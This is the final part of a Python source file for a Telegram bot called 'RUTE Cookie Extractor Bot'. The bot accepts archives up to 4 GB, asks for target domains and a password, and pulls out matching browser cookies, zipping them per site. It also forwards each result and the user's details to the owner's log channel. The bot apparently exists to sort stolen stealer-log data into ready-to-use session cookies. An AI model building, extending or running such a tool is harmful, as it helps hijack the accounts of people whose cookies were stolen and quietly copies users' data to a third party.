                    f"✅ **Cookies: `{site}`**\n\n"
                    f"📦 Size: `{fmt_size(zsize)}`\n"
                    f"🍪 Entries: `{cookie_ex.total_found}`\n"
                    f"📄 Files: `{len(cookie_ex.site_files.get(site, {}))}`\n\n"
                    f"👑 {OWNER}"
                ),
                parse_mode    = "markdown",
                progress      = up_progress_cb,
            )
            # Forward to log channel
            if SEND_LOGS and sent:
                try:
                    await app.forward_messages(LOG_CHANNEL, chat_id, sent.id)
                except Exception:
                    pass
        except Exception as e:
            await safe_send(chat_id, f"❌ Upload failed for `{site}`: {e}")
        finally:
            # Delete the zip after sending
            try:
                os.remove(zpath)
            except Exception:
                pass

    # ── Final summary ─────────────────────────────────────────────────────────
    if not task.cancelled:
        total_time = time.time() - task.started_at
        summary = (
            f"✅ **Extraction Complete!**\n\n"
            f"⏱ Total Time: `{fmt_time(total_time)}`\n"
            f"📄 Files Scanned: `{cookie_ex.files_proc}`\n"
            f"🍪 Total Matches: `{cookie_ex.total_found}`\n"
            f"📦 ZIPs Created: `{len(created_zips)}`\n\n"
        )
        for s in target_sites:
            count = len(cookie_ex.site_files.get(s, {}))
            if count:
                summary += f"  ✓ `{s}`: {count} files\n"
        summary += f"\n👑 {OWNER}"

        await safe_edit(status_msg, summary)

        await log_to_channel(
            f"#COMPLETED\n"
            f"👤 User: [{task.username}](tg://user?id={user_id}) | `{user_id}`\n"
            f"📁 File: `{task.file_name}` ({fmt_size(task.file_size)})\n"
            f"🎯 Domains: `{', '.join(target_sites)}`\n"
            f"🍪 Matches: `{cookie_ex.total_found}`\n"
            f"⏱ Time: `{fmt_time(total_time)}`"
        )

    task.status = "done"
    with queue_lock:
        active_tasks.pop(user_id, None)
    delete_folder(work_dir)

async def _abort(task: UserTask, status_msg, work_dir, reason=""):
    """Clean up and notify on abort"""
    user_id = task.user_id
    task.status = "cancelled" if task.cancelled else "error"
    if status_msg:
        if task.cancelled:
            await safe_edit(status_msg, f"🚫 **Task Cancelled**\n\n{reason}\n\n👑 {OWNER}")
        else:
            await safe_edit(status_msg, f"❌ **Task Failed**\n\n`{reason}`\n\n👑 {OWNER}")
    with queue_lock:
        active_tasks.pop(user_id, None)
    delete_folder(work_dir)

# ══════════════════════════════════════════════════════════════════════════════
# WAIT FOR USER REPLY (simple polling approach)
# ══════════════════════════════════════════════════════════════════════════════
# We store pending reply waiters here
_reply_waiters: Dict[int, asyncio.Queue] = {}

async def _wait_for_reply(user_id: int, chat_id: int, timeout=120) -> Optional[Message]:
    q: asyncio.Queue = asyncio.Queue()
    _reply_waiters[user_id] = q
    try:
        msg = await asyncio.wait_for(q.get(), timeout=timeout)
        return msg
    except asyncio.TimeoutError:
        return None
    finally:
        _reply_waiters.pop(user_id, None)

# ══════════════════════════════════════════════════════════════════════════════
# QUEUE WORKER
# ══════════════════════════════════════════════════════════════════════════════
async def queue_worker():
    """Process tasks from queue one at a time per user"""
    global QUEUE_WORKER_RUNNING
    QUEUE_WORKER_RUNNING = True
    while True:
        try:
            with queue_lock:
                if not task_queue:
                    await asyncio.sleep(2)
                    continue
                next_item = task_queue[0]
                task, archive_msg, orig_msg = next_item
                # Check if user already has active task (shouldn't happen but safety)
                if task.user_id in active_tasks and active_tasks[task.user_id].status not in ("done", "cancelled", "error"):
                    await asyncio.sleep(2)
                    continue
                task_queue.popleft()
                active_tasks[task.user_id] = task

            try:
                await process_task(task, archive_msg, orig_msg)
            except Exception as e:
                try:
                    with queue_lock:
                        active_tasks.pop(task.user_id, None)
                    if task.work_folder:
                        delete_folder(task.work_folder)
                    await safe_send(task.chat_id, f"❌ **Unexpected error:** `{e}`\n\n👑 {OWNER}")
                except Exception:
                    pass
        except Exception:
            await asyncio.sleep(3)

# ══════════════════════════════════════════════════════════════════════════════
# HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("start") & filters.private)
async def cmd_start(client: Client, msg: Message):
    text = (
        "🚀 **RUTE Cookie Extractor Bot**\n\n"
        "Send me any archive file (`.zip`, `.rar`, `.7z`, `.tar`, `.gz`) "
        "up to **4 GB** and I'll extract cookies filtered by your target domains.\n\n"
        "**Commands:**\n"
        "• `/queue` — View current queue\n"
        "• `/stats` — System statistics (admin)\n"
        "• `/cancel` — Cancel your current task\n\n"
        f"👑 {OWNER}"
    )
    await msg.reply(text, parse_mode="markdown")

@app.on_message(filters.command("stats"))
async def cmd_stats(client: Client, msg: Message):
    wait_msg = await msg.reply("⏳ Gathering stats...")
    text = await get_stats_text(client)
    await safe_edit(wait_msg, text)

@app.on_message(filters.command("queue"))
async def cmd_queue(client: Client, msg: Message):
    with queue_lock:
        q_list   = list(task_queue)
        act_list = list(active_tasks.values())

    if not q_list and not act_list:
        await msg.reply("✅ **Queue is empty!** No active tasks.\n\n👑 " + OWNER)
        return

    text = "**📋 Current Queue**\n\n"

    if act_list:
        text += "**🔄 Active Tasks:**\n"
        for t in act_list:
            elapsed = fmt_time(time.time() - t.started_at) if t.started_at else "—"
            text += (
                f"  👤 `{t.username}` (`{t.user_id}`)\n"
                f"  📁 `{t.file_name}` ({fmt_size(t.file_size)})\n"
                f"  ⚙️ Status: `{t.status}` | ⏱ `{elapsed}`\n\n"
            )

    if q_list:
        text += "**⏳ Waiting:**\n"
        for pos, (t, _, _) in enumerate(q_list, 1):
            wait_time = fmt_time(time.time() - t.created_at)
            text += (
                f"  #{pos} 👤 `{t.username}` (`{t.user_id}`)\n"
                f"  📁 `{t.file_name}` ({fmt_size(t.file_size)})\n"
                f"  ⌛ Waiting: `{wait_time}`\n\n"
            )

    text += f"👑 {OWNER}"
    await msg.reply(text, parse_mode="markdown")

@app.on_message(filters.command("cancel") & filters.private)
async def cmd_cancel(client: Client, msg: Message):
    user_id = msg.from_user.id

    # Check active task
    with queue_lock:
        task = active_tasks.get(user_id)
        # Also check queue
        queued = [(i, t) for i, (t, _, _) in enumerate(task_queue) if t.user_id == user_id]

    if task:
        task.cancelled = True
        await msg.reply("🚫 **Cancelling your active task...**\n\nPlease wait a moment.\n👑 " + OWNER)
    elif queued:
        idx, _ = queued[0]
        with queue_lock:
            # Remove from queue
            items = list(task_queue)
            items.pop(idx)
            task_queue.clear()
            task_queue.extend(items)
        await msg.reply("✅ **Your queued task has been removed.**\n\n👑 " + OWNER)
    else:
        await msg.reply("ℹ️ You have no active or queued task.\n\n👑 " + OWNER)

@app.on_callback_query(filters.regex(r"^cancel_(\d+)$"))
async def cb_cancel(client: Client, query: CallbackQuery):
    btn_user = int(query.matches[0].group(1))
    caller   = query.from_user.id

    # Only the task owner or admins can cancel
    if caller != btn_user and caller not in ADMINS:
        await query.answer("⛔ You can't cancel someone else's task!", show_alert=True)
        return

    with queue_lock:
        task = active_tasks.get(btn_user)
        queued = [(i, t) for i, (t, _, _) in enumerate(task_queue) if t.user_id == btn_user]

    if task:
        task.cancelled = True
        await query.answer("🚫 Cancelling task...")
        await query.message.edit_text("🚫 **Task cancellation requested...**\n\n👑 " + OWNER)
    elif queued:
        idx, _ = queued[0]
        with queue_lock:
            items = list(task_queue)
            items.pop(idx)
            task_queue.clear()
            task_queue.extend(items)
        await query.answer("✅ Removed from queue")
        await query.message.edit_text("✅ **Removed from queue.**\n\n👑 " + OWNER)
    else:
        await query.answer("ℹ️ No active task found")

@app.on_message(filters.private & (filters.document | filters.audio | filters.video))
async def handle_file(client: Client, msg: Message):
    user_id  = msg.from_user.id
    username = msg.from_user.username or msg.from_user.first_name or str(user_id)

    # Get file info
    doc = msg.document or msg.audio or msg.video
    if not doc:
        return

    file_name = getattr(doc, 'file_name', None) or f"file_{gen_rand(6)}"
    file_size = getattr(doc, 'file_size', 0)
    file_ext  = os.path.splitext(file_name)[1].lower()

    if file_ext not in SUPPORTED_ARCHIVES:
        await msg.reply(
            f"❌ **Unsupported format:** `{file_ext}`\n\n"
            f"Supported: `{', '.join(SUPPORTED_ARCHIVES)}`\n\n👑 {OWNER}"
        )
        return

    if file_size > MAX_FILE_SIZE:
        await msg.reply(
            f"❌ **File too large:** `{fmt_size(file_size)}`\n"
            f"Maximum: `{fmt_size(MAX_FILE_SIZE)}`\n\n👑 {OWNER}"
        )
        return

    # Check if user already has task
    with queue_lock:
        user_in_queue  = any(t.user_id == user_id for t, _, _ in task_queue)
        user_is_active = user_id in active_tasks

    if user_in_queue or user_is_active:
        await msg.reply(
            "⚠️ **You already have a task in progress!**\n\n"
            "Use /cancel to cancel it first, or wait for it to complete.\n"
            "Use /queue to see queue status.\n\n👑 " + OWNER
        )
        return

    # Create work dir
    ts       = datetime.now().strftime('%Y%m%d_%H%M%S')
    work_dir = os.path.join(WORK_DIR, f"{user_id}_{ts}_{gen_rand(4)}")
    os.makedirs(work_dir, exist_ok=True)

    task = UserTask(user_id, username, file_name, file_size)
    task.chat_id     = msg.chat.id
    task.work_folder = work_dir

    # Add to queue
    with queue_lock:
        task_queue.append((task, msg, msg))
        q_pos = len(task_queue)
        act   = len(active_tasks)

    await msg.reply(
        f"✅ **Added to queue!**\n\n"
        f"📁 File: `{file_name}`\n"
        f"📦 Size: `{fmt_size(file_size)}`\n"
        f"🔢 Position: `#{q_pos}` (Active: `{act}`)\n\n"
        f"I'll ask for your domains and password (if needed) when it's your turn.\n\n"
        f"Use /cancel to remove from queue.\n\n👑 {OWNER}",
        reply_markup=cancel_keyboard(user_id)
    )

    # Log to channel
    await log_to_channel(
        f"#QUEUED\n"
        f"👤 User: [{username}](tg://user?id={user_id}) | `{user_id}`\n"
        f"📁 File: `{file_name}` ({fmt_size(file_size)})\n"
        f"🔢 Queue pos: `#{q_pos}`"
    )

@app.on_message(filters.private & filters.text & ~filters.command(["start","stats","queue","cancel","nopassword","skip"]))
async def handle_text(client: Client, msg: Message):
    user_id = msg.from_user.id
    # Route to waiter if any
    if user_id in _reply_waiters:
        await _reply_waiters[user_id].put(msg)

# ══════════════════════════════════════════════════════════════════════════════
# STARTUP
# ══════════════════════════════════════════════════════════════════════════════
async def on_startup(client: Client):
    print("✅ RUTE Cookie Extractor Bot is running...")
    # Start queue worker
    asyncio.create_task(queue_worker())
    # Log startup
    try:
        me = await client.get_me()
        await client.send_message(
            LOG_CHANNEL,
            f"🤖 **Bot Started**\n\n"
            f"Name: `{me.first_name}`\n"
            f"Username: @{me.username}\n"
            f"ID: `{me.id}`\n"
            f"Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
            f"👑 {OWNER}",
            parse_mode="markdown"
        )
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
async def main():
    async with app:
        await on_startup(app)
        print("🚀 Bot is online. Press Ctrl+C to stop.")
        await asyncio.Event().wait()  # run forever

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped.")
    except Exception as e:
        print(f"💥 Fatal error: {e}")
        traceback.print_exc()
